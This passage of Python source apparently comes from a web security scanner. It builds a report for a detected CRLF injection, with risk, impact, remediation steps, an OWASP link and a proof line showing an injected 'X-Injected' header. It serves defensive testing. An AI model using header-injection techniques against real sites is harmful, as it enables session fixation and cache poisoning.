                        "The injected HTTP header 'X-Injected' appeared in the server's response, "
                        "indicating the application is inserting user input into response headers."
                    )
                    .risk(
                        "CRLF injection enables HTTP response splitting, cookie injection, "
                        "and can be chained with XSS for session fixation attacks."
                    )
                    .impact("Session fixation, XSS via response splitting, cache poisoning.")
                    .remediation(
                        "1. Strip or reject CR (\\r) and LF (\\n) characters from all input.\n"
                        "2. Encode user-controlled data before placing it in HTTP headers.\n"
                        "3. Use framework-level header setting functions that prevent injection."
                    )
                    .add_ref("https://owasp.org/www-community/attacks/HTTP_Response_Splitting")
                    .evidence(f"Injected header 'X-Injected' found in HTTP response")
                    .proof(f"GET {test_url}\nResponse headers contain injected X-Injected header")
                    .detected_by("A03_CRLF_INJECTION")
                    .build()
                )
                return
